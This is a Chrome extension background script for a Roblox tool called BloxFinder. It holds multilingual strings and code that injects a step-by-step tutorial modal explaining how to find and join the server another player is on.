      title: "¡Ya está todo listo!"
    },
    feedback: {
      question: "¿Tienes comentarios, problemas o ideas de características?",
      email: "Envíanos un correo electrónico a"
    }
  },

  fr_fr: {
    title: "Comment utiliser BloxFinder",
    step1: {
      title: "Aller au Jeu",
      description: "Ouvrez <strong>Roblox</strong> et allez au jeu que vous pensez que la personne joue."
    },
    step2: {
      title: "Ouvrir l'Onglet Serveurs",
      description: "Une fois sur la page du jeu :",
      bullets: [
        "Faites défiler vers le bas un peu",
        "Cliquez sur l'onglet <strong>\"Serveurs\"</strong>"
      ]
    },
    step3: {
      title: "Cliquer sur le Bouton \"BloxFinder\"",
      description1: "Vous verrez un bouton appelé <strong>\"BloxFinder\"</strong> au-dessus ou près de la liste des serveurs.",
      description2: "Cliquez dessus pour ouvrir l'outil BloxFinder."
    },
    step4: {
      title: "Entrer leur Nom d'Utilisateur ou ID Utilisateur",
      description: "Tapez le <strong>nom d'utilisateur Roblox</strong> ou <strong>ID utilisateur</strong> de la personne que vous essayez de trouver."
    },
    step5: {
      title: "Attendre la Recherche",
      description: "Après avoir saisi les informations, BloxFinder va scanner tous les serveurs pour trouver ce joueur."
    },
    step6: {
      title: "Rejoindre leur Serveur !",
      description1: "Si le joueur est trouvé, vous verrez le serveur dans lequel il se trouve.",
      description2: "▶️ Cliquez sur <strong>Rejoindre</strong> pour sauter dans le même serveur qu'eux !"
    },
    allSet: {
      title: "Vous êtes prêt !"
    },
    feedback: {
      question: "Vous avez des commentaires, des problèmes ou des idées de fonctionnalités ?",
      email: "Envoyez-nous un email à"
    }
  },

  it_it: {
    title: "Come usare BloxFinder",
    step1: {
      title: "Vai al Gioco",
      description: "Apri <strong>Roblox</strong> e vai al gioco che pensi stia giocando la persona."
    },
    step2: {
      title: "Apri la Scheda Server",
      description: "Una volta sulla pagina del gioco:",
      bullets: [
        "Scorri verso il basso un po'",
        "Clicca sulla scheda <strong>\"Server\"</strong>"
      ]
    },
    step3: {
      title: "Clicca il Pulsante \"BloxFinder\"",
      description1: "Vedrai un pulsante chiamato <strong>\"BloxFinder\"</strong> sopra o vicino alla lista dei server.",
      description2: "Cliccaci per aprire lo strumento BloxFinder."
    },
    step4: {
      title: "Inserisci il loro Nome Utente o ID Utente",
      description: "Digita il <strong>nome utente Roblox</strong> o <strong>ID utente</strong> della persona che stai cercando di trovare."
    },
    step5: {
      title: "Aspetta la Ricerca",
      description: "Dopo aver inserito le informazioni, BloxFinder scansionerà tutti i server per trovare quel giocatore."
    },
    step6: {
      title: "Unisciti al loro Server!",
      description1: "Se il giocatore viene trovato, vedrai il server in cui si trova.",
      description2: "▶️ Clicca <strong>Unisciti</strong> per saltare nello stesso server di loro!"
    },
    allSet: {
      title: "Sei pronto!"
    },
    feedback: {
      question: "Hai feedback, problemi o idee per nuove funzionalità?",
      email: "Inviaci una email a"
    }
  },

  pl_pl: {
    title: "Jak używać BloxFinder",
    step1: {
      title: "Idź do Gry",
      description: "Otwórz <strong>Roblox</strong> i idź do gry, w którą myślisz, że gra ta osoba."
    },
    step2: {
      title: "Otwórz Zakładkę Serwery",
      description: "Gdy jesteś na stronie gry:",
      bullets: [
        "Przewiń trochę w dół",
        "Kliknij na zakładkę <strong>\"Serwery\"</strong>"
      ]
    },
    step3: {
      title: "Kliknij Przycisk \"BloxFinder\"",
      description1: "Zobaczysz przycisk o nazwie <strong>\"BloxFinder\"</strong> nad lub w pobliżu listy serwerów.",
      description2: "Kliknij go, aby otworzyć narzędzie BloxFinder."
    },
    step4: {
      title: "Wprowadź ich Nazwę Użytkownika lub ID Użytkownika",
      description: "Wpisz <strong>nazwę użytkownika Roblox</strong> lub <strong>ID użytkownika</strong> osoby, którą próbujesz znaleźć."
    },
    step5: {
      title: "Poczekaj na Wyszukiwanie",
      description: "Po wprowadzeniu informacji, BloxFinder przeskanuje wszystkie serwery, aby znaleźć tego gracza."
    },
    step6: {
      title: "Dołącz do ich Serwera!",
      description1: "Jeśli gracz zostanie znaleziony, zobaczysz serwer, na którym się znajduje.",
      description2: "▶️ Kliknij <strong>Dołącz</strong>, aby wskoczyć na ten sam serwer co oni!"
    },
    allSet: {
      title: "Gotowe!"
    },
    feedback: {
      question: "Masz opinie, problemy lub pomysły na funkcje?",
      email: "Wyślij nam email na"
    }
  },

  pt_br: {
    title: "Como usar o BloxFinder",
    step1: {
      title: "Vá para o Jogo",
      description: "Abra o <strong>Roblox</strong> e vá para o jogo que você acha que a pessoa está jogando."
    },
    step2: {
      title: "Abra a Aba Servidores",
      description: "Quando estiver na página do jogo:",
      bullets: [
        "Role um pouco para baixo",
        "Clique na aba <strong>\"Servidores\"</strong>"
      ]
    },
    step3: {
      title: "Clique no Botão \"BloxFinder\"",
      description1: "Você verá um botão chamado <strong>\"BloxFinder\"</strong> acima ou perto da lista de servidores.",
      description2: "Clique nele para abrir a ferramenta BloxFinder."
    },
    step4: {
      title: "Digite o Nome de Usuário ou ID do Usuário",
      description: "Digite o <strong>nome de usuário do Roblox</strong> ou <strong>ID do usuário</strong> da pessoa que você está tentando encontrar."
    },
    step5: {
      title: "Aguarde a Busca",
      description: "Depois de inserir as informações, o BloxFinder irá escanear todos os servidores para encontrar esse jogador."
    },
    step6: {
      title: "Entre no Servidor Deles!",
      description1: "Se o jogador for encontrado, você verá o servidor em que eles estão.",
      description2: "▶️ Clique em <strong>Entrar</strong> para pular para o mesmo servidor que eles!"
    },
    allSet: {
      title: "Você está pronto!"
    },
    feedback: {
      question: "Tem feedback, problemas ou ideias de recursos?",
      email: "Nos envie um email para"
    }
  },

  vi_vn: {
    title: "Cách sử dụng BloxFinder",
    step1: {
      title: "Đi đến Trò chơi",
      description: "Mở <strong>Roblox</strong> và đến trò chơi mà bạn nghĩ người đó đang chơi."
    },
    step2: {
      title: "Mở Tab Máy chủ",
      description: "Khi bạn đã ở trang trò chơi:",
      bullets: [
        "Cuộn xuống một chút",
        "Nhấp vào tab <strong>\"Máy chủ\"</strong>"
      ]
    },
    step3: {
      title: "Nhấp vào Nút \"BloxFinder\"",
      description1: "Bạn sẽ thấy một nút có tên <strong>\"BloxFinder\"</strong> phía trên hoặc gần danh sách máy chủ.",
      description2: "Nhấp vào nó để mở công cụ BloxFinder."
    },
    step4: {
      title: "Nhập Tên người dùng hoặc ID người dùng của họ",
      description: "Gõ <strong>tên người dùng Roblox</strong> hoặc <strong>ID người dùng</strong> của người bạn đang cố gắng tìm."
    },
    step5: {
      title: "Chờ Tìm kiếm",
      description: "Sau khi nhập thông tin, BloxFinder sẽ quét tất cả máy chủ để tìm người chơi đó."
    },
    step6: {
      title: "Tham gia Máy chủ của họ!",
      description1: "Nếu tìm thấy người chơi, bạn sẽ thấy máy chủ mà họ đang ở.",
      description2: "▶️ Nhấp <strong>Tham gia</strong> để nhảy vào cùng máy chủ với họ!"
    },
    allSet: {
      title: "Bạn đã sẵn sàng!"
    },
    feedback: {
      question: "Bạn có phản hồi, vấn đề hoặc ý tưởng tính năng?",
      email: "Gửi email cho chúng tôi tại"
    }
  },

  tr_tr: {
    title: "BloxFinder Nasıl Kullanılır",
    step1: {
      title: "Oyuna Git",
      description: "<strong>Roblox</strong>'u aç ve kişinin oynadığını düşündüğün oyuna git."
    },
    step2: {
      title: "Sunucular Sekmesini Aç",
      description: "Oyun sayfasında olduğunda:",
      bullets: [
        "Biraz aşağı kaydır",
        "<strong>\"Sunucular\"</strong> sekmesine tıkla"
      ]
    },
    step3: {
      title: "\"BloxFinder\" Düğmesine Tıkla",
      description1: "Sunucu listesinin üzerinde veya yakınında <strong>\"BloxFinder\"</strong> adlı bir düğme göreceksin.",
      description2: "BloxFinder aracını açmak için ona tıkla."
    },
    step4: {
      title: "Kullanıcı Adını veya Kullanıcı ID'sini Gir",
      description: "Bulmaya çalıştığın kişinin <strong>Roblox kullanıcı adını</strong> veya <strong>kullanıcı ID'sini</strong> yaz."
    },
    step5: {
      title: "Aramayı Bekle",
      description: "Bilgileri girdikten sonra, BloxFinder o oyuncuyu bulmak için tüm sunucuları tarayacak."
    },
    step6: {
      title: "Sunucularına Katıl!",
      description1: "Oyuncu bulunursa, bulundukları sunucuyu göreceksin.",
      description2: "▶️ Onlarla aynı sunucuya atlamak için <strong>Katıl</strong>'a tıkla!"
    },
    allSet: {
      title: "Hazırsın!"
    },
    feedback: {
      question: "Geri bildirim, sorun veya özellik fikirlerin var mı?",
      email: "Bize e-posta gönder"
    }
  },

  th_th: {
    title: "วิธีใช้ BloxFinder",
    step1: {
      title: "ไปที่เกม",
      description: "เปิด <strong>Roblox</strong> และไปที่เกมที่คุณคิดว่าคนนั้นกำลังเล่น"
    },
    step2: {
      title: "เปิดแท็บเซิร์ฟเวอร์",
      description: "เมื่อคุณอยู่ในหน้าเกม:",
      bullets: [
        "เลื่อนลงมาเล็กน้อย",
        "คลิกที่แท็บ <strong>\"เซิร์ฟเวอร์\"</strong>"
      ]
    },
    step3: {
      title: "คลิกปุ่ม \"BloxFinder\"",
      description1: "คุณจะเห็นปุ่มชื่อ <strong>\"BloxFinder\"</strong> อยู่เหนือหรือใกล้รายการเซิร์ฟเวอร์",
      description2: "คลิกเพื่อเปิดเครื่องมือ BloxFinder"
    },
    step4: {
      title: "กรอกชื่อผู้ใช้หรือ User ID ของพวกเขา",
      description: "พิมพ์ <strong>ชื่อผู้ใช้ Roblox</strong> หรือ <strong>user ID</strong> ของคนที่คุณพยายามหา"
    },
    step5: {
      title: "รอการค้นหา",
      description: "หลังจากกรอกข้อมูล BloxFinder จะสแกนเซิร์ฟเวอร์ทั้งหมดเพื่อหาผู้เล่นนั้น"
    },
    step6: {
      title: "เข้าร่วมเซิร์ฟเวอร์ของพวกเขา!",
      description1: "หากพบผู้เล่น คุณจะเห็นเซิร์ฟเวอร์ที่พวกเขาอยู่",
      description2: "▶️ คลิก <strong>เข้าร่วม</strong> เพื่อกระโดดเข้าไปในเซิร์ฟเวอร์เดียวกันกับพวกเขา!"
    },
    allSet: {
      title: "คุณพร้อมแล้ว!"
    },
    feedback: {
      question: "มีความคิดเห็น ปัญหา หรือไอเดียฟีเจอร์?",
      email: "ส่งอีเมลหาเราที่"
    }
  },

  zh_cn: {
    title: "如何使用 BloxFinder",
    step1: {
      title: "前往游戏",
      description: "打开 <strong>Roblox</strong> 并前往你认为那个人在玩的游戏。"
    },
    step2: {
      title: "打开服务器标签",
      description: "当你在游戏页面时：",
      bullets: [
        "向下滚动一点",
        "点击<strong>\"服务器\"</strong>标签"
      ]
    },
    step3: {
      title: "点击 \"BloxFinder\" 按钮",
      description1: "你会看到一个名为<strong>\"BloxFinder\"</strong>的按钮在服务器列表上方或附近。",
      description2: "点击它以打开 BloxFinder 工具。"
    },
    step4: {
      title: "输入他们的用户名或用户ID",
      description: "输入你想要找的人的<strong>Roblox 用户名</strong>或<strong>用户 ID</strong>。"
    },
    step5: {
      title: "等待搜索",
      description: "输入信息后，BloxFinder 将扫描所有服务器来找到该玩家。"
    },
    step6: {
      title: "加入他们的服务器！",
      description1: "如果找到了玩家，你将看到他们所在的服务器。",
      description2: "▶️ 点击<strong>加入</strong>跳转到与他们相同的服务器！"
    },
    allSet: {
      title: "你准备好了！"
    },
    feedback: {
      question: "有反馈、问题或功能想法？",
      email: "发送邮件给我们"
    }
  },

  zh_tw: {
    title: "如何使用 BloxFinder",
    step1: {
      title: "前往遊戲",
      description: "打開 <strong>Roblox</strong> 並前往你認為那個人在玩的遊戲。"
    },
    step2: {
      title: "打開伺服器標籤",
      description: "當你在遊戲頁面時：",
      bullets: [
        "向下滾動一點",
        "點擊<strong>\"伺服器\"</strong>標籤"
      ]
    },
    step3: {
      title: "點擊 \"BloxFinder\" 按鈕",
      description1: "你會看到一個名為<strong>\"BloxFinder\"</strong>的按鈕在伺服器清單上方或附近。",
      description2: "點擊它以打開 BloxFinder 工具。"
    },
    step4: {
      title: "輸入他們的使用者名稱或使用者ID",
      description: "輸入你想要找的人的<strong>Roblox 使用者名稱</strong>或<strong>使用者 ID</strong>。"
    },
    step5: {
      title: "等待搜尋",
      description: "輸入資訊後，BloxFinder 將掃描所有伺服器來找到該玩家。"
    },
    step6: {
      title: "加入他們的伺服器！",
      description1: "如果找到了玩家，你將看到他們所在的伺服器。",
      description2: "▶️ 點擊<strong>加入</strong>跳轉到與他們相同的伺服器！"
    },
    allSet: {
      title: "你準備好了！"
    },
    feedback: {
      question: "有反饋、問題或功能想法？",
      email: "發送郵件給我們"
    }
  },

  ja_jp: {
    title: "BloxFinderの使い方",
    step1: {
      title: "ゲームに行く",
      description: "<strong>Roblox</strong>を開いて、その人がプレイしていると思うゲームに行きます。"
    },
    step2: {
      title: "サーバータブを開く",
      description: "ゲームページにいるとき：",
      bullets: [
        "少し下にスクロール",
        "<strong>\"サーバー\"</strong>タブをクリック"
      ]
    },
    step3: {
      title: "\"BloxFinder\"ボタンをクリック",
      description1: "サーバーリストの上または近くに<strong>\"BloxFinder\"</strong>というボタンが表示されます。",
      description2: "それをクリックしてBloxFinderツールを開きます。"
    },
    step4: {
      title: "ユーザー名またはユーザーIDを入力",
      description: "見つけようとしている人の<strong>Robloxユーザー名</strong>または<strong>ユーザーID</strong>を入力します。"
    },
    step5: {
      title: "検索を待つ",
      description: "情報を入力した後、BloxFinderがそのプレイヤーを見つけるためにすべてのサーバーをスキャンします。"
    },
    step6: {
      title: "彼らのサーバーに参加！",
      description1: "プレイヤーが見つかったら、彼らがいるサーバーが表示されます。",
      description2: "▶️ <strong>参加</strong>をクリックして同じサーバーに飛び込みましょう！"
    },
    allSet: {
      title: "準備完了！"
    },
    feedback: {
      question: "フィードバック、問題、機能のアイデアはありますか？",
      email: "メールを送ってください"
    }
  },

  ko_kr: {
    title: "BloxFinder 사용법",
    step1: {
      title: "게임으로 이동",
      description: "<strong>Roblox</strong>를 열고 그 사람이 플레이하고 있다고 생각하는 게임으로 이동합니다."
    },
    step2: {
      title: "서버 탭 열기",
      description: "게임 페이지에 있을 때:",
      bullets: [
        "조금 아래로 스크롤",
        "<strong>\"서버\"</strong> 탭을 클릭"
      ]
    },
    step3: {
      title: "\"BloxFinder\" 버튼 클릭",
      description1: "서버 목록 위나 근처에 <strong>\"BloxFinder\"</strong>라는 버튼이 표시됩니다.",
      description2: "그것을 클릭하여 BloxFinder 도구를 엽니다."
    },
    step4: {
      title: "사용자명 또는 사용자 ID 입력",
      description: "찾으려는 사람의 <strong>Roblox 사용자명</strong> 또는 <strong>사용자 ID</strong>를 입력합니다."
    },
    step5: {
      title: "검색 대기",
      description: "정보를 입력한 후 BloxFinder가 해당 플레이어를 찾기 위해 모든 서버를 스캔합니다."
    },
    step6: {
      title: "그들의 서버에 참가하세요!",
      description1: "플레이어가 발견되면 그들이 있는 서버를 볼 수 있습니다.",
      description2: "▶️ <strong>참가</strong>를 클릭하여 같은 서버로 점프하세요!"
    },
    allSet: {
      title: "준비 완료!"
    },
    feedback: {
      question: "피드백, 문제 또는 기능 아이디어가 있으신가요?",
      email: "이메일을 보내주세요"
    }
  },

  ar_001: {
    title: "كيفية استخدام BloxFinder",
    step1: {
      title: "اذهب إلى اللعبة",
      description: "افتح <strong>Roblox</strong> واذهب إلى اللعبة التي تعتقد أن الشخص يلعبها."
    },
    step2: {
      title: "افتح تبويب الخوادم",
      description: "عندما تكون في صفحة اللعبة:",
      bullets: [
        "مرر قليلاً إلى الأسفل",
        "انقر على تبويب <strong>\"الخوادم\"</strong>"
      ]
    },
    step3: {
      title: "انقر على زر \"BloxFinder\"",
      description1: "ستشاهد زراً يسمى <strong>\"BloxFinder\"</strong> أعلى أو بالقرب من قائمة الخوادم.",
      description2: "انقر عليه لفتح أداة BloxFinder."
    },
    step4: {
      title: "أدخل اسم المستخدم أو معرف المستخدم الخاص بهم",
      description: "اكتب <strong>اسم المستخدم في Roblox</strong> أو <strong>معرف المستخدم</strong> للشخص الذي تحاول العثور عليه."
    },
    step5: {
      title: "انتظر البحث",
      description: "بعد إدخال المعلومات، سيقوم BloxFinder بمسح جميع الخوادم للعثور على ذلك اللاعب."
    },
    step6: {
      title: "انضم إلى خادمهم!",
      description1: "إذا تم العثور على اللاعب، ستشاهد الخادم الذي يتواجد فيه.",
      description2: "▶️ انقر <strong>انضمام</strong> للقفز إلى نفس الخادم معهم!"
    },
    allSet: {
      title: "أنت جاهز!"
    },
    feedback: {
      question: "هل لديك ملاحظات أو مشاكل أو أفكار للميزات؟",
      email: "أرسل لنا بريداً إلكترونياً على"
    }
  }
};

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.action === 'showTutorial') {
    (async () => {
      try {
        await chrome.scripting.executeScript({
          target: { tabId: sender.tab.id },
          func: executeRobloxCode,
          args: [localizationStrings]
        });
        sendResponse({ success: true });
      } catch (error) {
        console.error('Failed to show tutorial:', error);
        sendResponse({ success: false, error: error.message });
      }
    })();
    return true;
  }
});
chrome.action.onClicked.addListener(async (tab) => {
  if (tab.url && (tab.url.includes('roblox.com') || tab.url.includes('www.roblox.com'))) {
    try {
      await chrome.scripting.executeScript({
        target: { tabId: tab.id },
        func: executeRobloxCode,
        args: [localizationStrings]
      });
    } catch (error) {
      try {
        await chrome.scripting.executeScript({
          target: { tabId: tab.id },
          files: ['content.js']
        });
      } catch (secondError) {
      }
    }
  }
});

function executeRobloxCode(localizationStrings) {
  const existingModal = document.getElementById('bloxfinder-modal-container');
  if (existingModal) {
    existingModal.remove();
    return;
  }

  let currentLang = 'en_us';
  
  if (typeof chrome !== 'undefined' && chrome.storage) {
    chrome.storage.local.get(['robloxLanguage'], (result) => {
      if (result.robloxLanguage && localizationStrings[result.robloxLanguage]) {
        currentLang = result.robloxLanguage;
      }
      createModal(localizationStrings[currentLang]);
    });
  } else {
    createModal(localizationStrings[currentLang]);
  }

  function createModal(strings) {
    const theme = {
      background: 'rgb(39, 41, 48)',
      text: 'rgb(255, 255, 255)',
      closeButton: 'rgb(247, 247, 248)',
      accent: 'rgb(88, 101, 242)'
    };

    const modalHTML = `
      <div id="bloxfinder-modal-container" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9998; display: flex; align-items: center; justify-content: center;">
        <div class="modal-backdrop" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.5); z-index: 9998;" role="dialog"></div>
        <div id="bloxfinder-tutorial-modal" style="position: relative; z-index: 9999;">
          <div style="background: ${theme.background}; border-radius: 16px; padding: 32px; width: 520px; height: auto; max-height: 80vh; position: relative; display: flex; flex-direction: column;">
            <button id="close-tutorial-modal" style="position: absolute; top: 22px; right: 27px; background: none; border: none; font-size: 43px; color: ${theme.closeButton}; cursor: pointer; line-height: 1; padding: 5px; width: 43px; height: 43px; display: flex; align-items: center; justify-content: center; border-radius: 50%; transition: background 0.2s; z-index: 10;">×</button>
            
            <div style="text-align: center; margin-bottom: 24px;">
              <h2 style="margin: 0px; font-size: 32px; font-weight: 700; color: ${theme.text}; text-align: center;">${strings.title}</h2>
            </div>
            
            <div style="overflow-y: auto; flex: 1; padding-right: 16px; max-height: calc(80vh - 120px);">
              <div style="color: ${theme.text}; font-size: 15px; line-height: 1.5; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;">
                
                <div style="background: rgba(255,255,255,0.03); border-radius: 12px; padding: 20px; margin-bottom: 16px; border-left: 4px solid ${theme.accent};">
                  <div style="display: flex; align-items: center; margin-bottom: 12px;">
                    <div style="background: ${theme.accent}; color: white; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: 700; margin-right: 12px;">1</div>
                    <h3 style="color: ${theme.text}; font-size: 17px; font-weight: 600; margin: 0;">${strings.step1.title}</h3>
                  </div>
                  <p style="margin: 0 0 10px 36px; color: rgb(200, 200, 200);">${strings.step1.description}</p>
               
                </div>

                <div style="background: rgba(255,255,255,0.03); border-radius: 12px; padding: 20px; margin-bottom: 16px; border-left: 4px solid ${theme.accent};">
                  <div style="display: flex; align-items: center; margin-bottom: 12px;">
                    <div style="background: ${theme.accent}; color: white; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: 700; margin-right: 12px;">2</div>
                    <h3 style="color: ${theme.text}; font-size: 17px; font-weight: 600; margin: 0;">${strings.step2.title}</h3>
                  </div>
                  <p style="margin: 0 0 10px 36px; color: rgb(200, 200, 200);">${strings.step2.description}</p>
                  <ul style="margin: 0 0 10px 36px; color: rgb(200, 200, 200);">
                    <li style="margin-bottom: 6px;">• ${strings.step2.bullets[0]}</li>
                    <li style="margin-bottom: 6px;">• ${strings.step2.bullets[1]}</li>
                  </ul>
                  <div style="margin: 12px 0 0 20px; text-align: left; padding: 12px;">
                    <img id="bloxfinder-servers-image" src="" alt="Servers List" style="max-width: 300px; height: auto; border-radius: 6px; box-shadow: 0 2px 8px rgba(0,0,0,0.3);">
                  </div>
                </div>

                <div style="background: rgba(255,255,255,0.03); border-radius: 12px; padding: 20px; margin-bottom: 16px; border-left: 4px solid ${theme.accent};">
                  <div style="display: flex; align-items: center; margin-bottom: 12px;">
                    <div style="background: ${theme.accent}; color: white; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: 700; margin-right: 12px;">3</div>
                    <h3 style="color: ${theme.text}; font-size: 17px; font-weight: 600; margin: 0;">${strings.step3.title}</h3>
                  </div>
                  <p style="margin: 0 0 8px 36px; color: rgb(200, 200, 200);">${strings.step3.description1}</p>
                  <p style="margin: 0 0 12px 36px; color: rgb(200, 200, 200);">${strings.step3.description2}</p>
                  <div style="margin: 12px 0 0 20px; text-align: left; padding: 12px;">
                    <img id="bloxfinder-button-image" src="" alt="BloxFinder Button" style="max-width: 300px; height: auto; border-radius: 6px; box-shadow: 0 2px 8px rgba(0,0,0,0.3);">
                  </div>
                </div>

                <div style="background: rgba(255,255,255,0.03); border-radius: 12px; padding: 20px; margin-bottom: 16px; border-left: 4px solid ${theme.accent};">
                  <div style="display: flex; align-items: center; margin-bottom: 12px;">
                    <div style="background: ${theme.accent}; color: white; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: 700; margin-right: 12px;">4</div>
                    <h3 style="color: ${theme.text}; font-size: 17px; font-weight: 600; margin: 0;">${strings.step4.title}</h3>
                  </div>
                  <p style="margin: 0 0 10px 36px; color: rgb(200, 200, 200);">${strings.step4.description}</p>
                  <div style="margin: 12px 0 0 20px; text-align: left; padding: 12px;">
                    <img id="bloxfinder-enteruser-image" src="" alt="Enter Username" style="max-width: 300px; height: auto; border-radius: 6px; box-shadow: 0 2px 8px rgba(0,0,0,0.3);">
                  </div>
                </div>

                <div style="background: rgba(255,255,255,0.03); border-radius: 12px; padding: 20px; margin-bottom: 16px; border-left: 4px solid ${theme.accent};">
                  <div style="display: flex; align-items: center; margin-bottom: 12px;">
                    <div style="background: ${theme.accent}; color: white; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: 700; margin-right: 12px;">5</div>
                    <h3 style="color: ${theme.text}; font-size: 17px; font-weight: 600; margin: 0;">${strings.step5.title}</h3>
                  </div>
                  <p style="margin: 0 0 10px 36px; color: rgb(200, 200, 200);">${strings.step5.description}</p>
                  <div style="margin: 12px 0 0 20px; text-align: left; padding: 12px;">
                    <img id="bloxfinder-searching-image" src="" alt="Searching" style="max-width: 300px; height: auto; border-radius: 6px; box-shadow: 0 2px 8px rgba(0,0,0,0.3);">
                  </div>
                </div>

                <div style="background: rgba(255,255,255,0.03); border-radius: 12px; padding: 20px; margin-bottom: 16px; border-left: 4px solid ${theme.accent};">
                  <div style="display: flex; align-items: center; margin-bottom: 12px;">
                    <div style="background: ${theme.accent}; color: white; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: 700; margin-right: 12px;">6</div>
                    <h3 style="color: ${theme.text}; font-size: 17px; font-weight: 600; margin: 0;">${strings.step6.title}</h3>
                  </div>
                  <p style="margin: 0 0 8px 36px; color: rgb(200, 200, 200);">${strings.step6.description1}</p>
                  <p style="margin: 0 0 0 36px; color: rgb(200, 200, 200);">${strings.step6.description2}</p>
                </div>

                <div style="background: linear-gradient(135deg, rgba(88, 101, 242, 0.15), rgba(0, 123, 255, 0.15)); border-radius: 12px; padding: 5px; text-align: center; border: 1px solid rgba(88, 101, 242, 0.3); margin-bottom: 16px;">
                  <div style="font-size: 24px; margin-bottom: 8px;">🎉</div>
                  <h3 style="margin: 0 0 8px 0; font-size: 18px; font-weight: 700; color: ${theme.text};">${strings.allSet.title}</h3>
                </div>

                <div style="background: rgba(255,255,255,0.02); border-radius: 12px; padding: 10px; text-align: center; border: 1px solid rgba(255,255,255,0.08);">
                  <div style="font-size: 18px; margin-bottom: 10px;">💬</div>
                  <p style="margin: 0 0 12px 0; font-size: 16px; color: rgb(200, 200, 200); font-weight: 600;">${strings.feedback.question}</p>
                  <p style="margin: 0; font-size: 15px; color: rgb(180, 180, 180);">
                    ${strings.feedback.email} 
                    <a target="_blank" href="mailto:bloxfinder@outlook.com" style="color: ${theme.accent}; text-decoration: underline; font-weight: 600; transition: color 0.2s;" 
                       onmouseover="this.style.color='rgb(108, 121, 255)'" 
                       onmouseout="this.style.color='${theme.accent}'">bloxfinder@outlook.com</a>
                  </p>
                </div>

              </div>
            </div>
          </div>
        </div>
      </div>
    `;

    document.body.insertAdjacentHTML('beforeend', modalHTML);

    const buttonImage = document.getElementById('bloxfinder-button-image');
    const serversImage = document.getElementById('bloxfinder-servers-image');
    if (chrome && chrome.runtime && chrome.runtime.getURL) {
      buttonImage.src = chrome.runtime.getURL('/images/BloxFinderButton.png');
      
      chrome.storage.local.get({ "robloxLanguage": "en" }, (result) => {
        const languageCode = result.robloxLanguage;
        serversImage.src = chrome.runtime.getURL(`/images/${languageCode}servers.png`);
      });
    }

    const enteruserImage = document.getElementById('bloxfinder-enteruser-image');
    const searchingImage = document.getElementById('bloxfinder-searching-image');
    if (chrome && chrome.runtime && chrome.runtime.getURL) {
      chrome.storage.local.get({ "robloxLanguage": "en" }, (result) => {
        const languageCode = result.robloxLanguage;
        enteruserImage.src = chrome.runtime.getURL(`/images/${languageCode}enteruser.png`);
        searchingImage.src = chrome.runtime.getURL(`/images/${languageCode}searching.png`);
      });
    }

    const closeButton = document.getElementById('close-tutorial-modal');
    closeButton.addEventListener('click', () => {
      const modalContainer = document.getElementById('bloxfinder-modal-container');
      modalContainer.remove();
    });

    closeButton.addEventListener('mouseenter', () => {
      closeButton.style.background = 'rgba(255,255,255,0.1)';
    });
    
    closeButton.addEventListener('mouseleave', () => {
      closeButton.style.background = 'none';
    });

    const modal = document.getElementById('bloxfinder-modal-container');
    modal.addEventListener('click', (e) => {
      if (e.target === modal || e.target.classList.contains('modal-backdrop')) {
        modal.remove();
      }
    });
  }
}
